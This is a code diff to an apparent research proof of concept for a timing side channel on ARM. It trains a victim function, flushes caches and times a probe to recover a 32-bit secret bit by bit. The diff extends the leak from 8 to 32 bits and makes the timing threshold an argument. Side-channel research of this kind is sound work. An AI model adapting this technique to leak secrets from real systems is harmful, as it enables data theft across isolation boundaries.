@@ -41,12 +41,16 @@ uint64_t fast, slow;
 //32 MB = 32 * 2^20 = 2 ^ 5 * 2^20 = 2^25
 //big_array has to be this size!
 static uint32_t big_array[1048576];
+static uint32_t big_array2[1048576];
+static uint32_t big_array3[1048576];
 
 void flush_cache()
 {
   for (int i = 0; i < 1048576; i++)
   {
     big_array[i] = i;
+    big_array2[i] = i;
+    big_array3[i] = i;
   }
 }
 
@@ -63,12 +67,12 @@ double __attribute__((optnone)) victim_function(register int secret, register in
     
     asm volatile (
         // "1: \n"  // Label for the loop start
-        ".rept 53\n\t"  // Repeat the following instructions 47 times
+        ".rept 4000\n\t"  // Repeat the following instructions 47 times
         "fsqrt d0, d0\n\t"  // Compute the square root of the double-precision value in d0
         "fmul d0, d0, d0\n\t"  // Multiply the value in d0 by itself
         ".endr\n\t"
     );
-    *(volatile uint64_t*)&global_variable;
+    //*(volatile uint64_t*)&global_variable;
   }
   return 0;
 }
@@ -79,6 +83,7 @@ int main(int argc, char *argv[])
   volatile double tmp_value1, tmp_value, tmp_value2;
   timer_start();
   int secret = atoi(argv[1]);
+  int threshold = atoi(argv[2]);
   int guess = 0;
 
   memory_fence();
@@ -89,9 +94,9 @@ int main(int argc, char *argv[])
 
   flush_cache();
   memory_fence();
-  uint64_t result[8] = {0};
+  uint64_t result[32] = {0};
 
-  for (volatile int i = 0; i < 8; i++) {
+  for (volatile int i = 0; i < 32; i++) {
     memory_fence();
 
     //Train victim function
@@ -116,7 +121,7 @@ int main(int argc, char *argv[])
     memory_fence();
 
     //if probe time passes threshold, then guess 1, otherwise guess 0
-    int tmp = time > THRESHOLD ? 0 : 1;
+    int tmp = time > threshold ? 0 : 1;
     result[i] = tmp;
     guess = guess | (tmp << i);
     memory_fence();
@@ -125,7 +130,7 @@ int main(int argc, char *argv[])
     asm volatile (".rept 4096;\nnop;\n.endr;");
   }
   memory_fence();
-  for (int i = 0; i < 8; i++)
+  for (int i = 0; i < 32; i++)
     printf("%3ld ", result[i]);
   printf("Guess : %3d, --> %d\n", guess, guess == secret ? 1 : 0);
 
